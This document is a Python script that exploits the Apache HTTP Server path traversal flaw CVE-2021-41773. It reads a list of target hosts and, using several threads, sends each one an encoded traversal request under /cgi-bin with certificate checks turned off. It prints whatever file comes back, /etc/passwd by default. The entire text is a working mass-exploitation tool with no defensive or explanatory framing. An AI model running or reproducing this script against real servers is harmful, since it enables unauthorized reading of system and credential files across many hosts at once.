import argparse
import requests
import concurrent.futures
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_path_traversal(host, target_path):
    if not host.startswith('http://') and not host.startswith('https://'):
        host = 'https://' + host
    
    payload_url = f"{host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{target_path}"
    try:
        response = requests.get(payload_url, verify=False)
        if response.status_code == 200:
            print(f"[+] Successful exploit against {host}:")
            print(response.text)
        else:
            print(f"[-] Failed exploit against {host}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error with {host}: {e}")

def exploit_targets(targets_file, target_path, num_threads):
    try:
        with open(targets_file, 'r') as f:
            targets = f.readlines()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(exploit_path_traversal, host.strip(), target_path): host.strip() for host in targets if host.strip()}

            for future in concurrent.futures.as_completed(futures):
                host = futures[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[-] Error with {host}: {e}")

    except FileNotFoundError:
        print(f"[-] The file '{targets_file}' was not found.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description='Exploit Apache HTTP Server Path Traversal (CVE-2021-41773)')
    parser.add_argument('-f', '--file', required=True, help='File containing the list of target URLs/IPs')
    parser.add_argument('-p', '--path', default='/etc/passwd', help='Path to access (default: /etc/passwd)')
    parser.add_argument('-t', '--thread', type=int, default=5, help='Number of threads to use (default: 5)')

    args = parser.parse_args()

    exploit_targets(args.file, args.path, args.thread)

if __name__ == "__main__":
    main()
